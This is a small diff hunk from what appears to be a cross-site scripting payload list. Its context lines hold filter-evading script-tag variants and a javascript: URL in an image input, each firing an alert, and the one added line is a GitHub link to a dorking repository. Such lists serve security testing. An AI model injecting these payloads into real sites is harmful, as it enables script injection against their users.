@@ -162,6 +162,7 @@ script>
 </script></script><<<<script><>>>><<<script>alert
 (123)</script>
 <html><noalert><noscript>(123)</noscript><script>
+https://github.com/Ishanoshada/GDorks/
 (123)</script>
 <INPUT TYPE="IMAGE" SRC="javascript:alert
 ('XSS');">
